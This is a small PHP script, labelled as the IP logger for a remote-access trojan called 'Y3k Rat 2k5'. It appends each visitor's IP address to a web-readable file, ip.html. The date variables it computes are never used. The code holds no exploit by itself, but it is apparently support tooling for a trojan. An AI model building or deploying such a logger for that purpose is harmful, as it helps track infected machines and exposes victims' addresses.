<? ///////////////////////////
   ///////////////////////////
   ////// Y3k Rat 2k5 ////////
   ////////IP LOGGER /////////
   ////////// PHP ////////////
   ///////////////////////////
   ///////////////////////////
?> 
<?php 
    $day = date("l"); 
    $month = date("F"); 
    $year = date("Y"); 
    $date = date("jS"); 
    $hours = date("g"); 
    $minutes = date("i"); 
    $tod = date("A"); 
     
    if(substr($minutes, 0, 1) == 0) 
        $minutes = substr($minutes, 1, 2); 
?> 
<? 
$ip = $_SERVER['REMOTE_ADDR']; 
?> 
<? 
$fp=fopen("ip.html","a"); 
fputs($fp,"$ip*");
fclose($fp);
?> 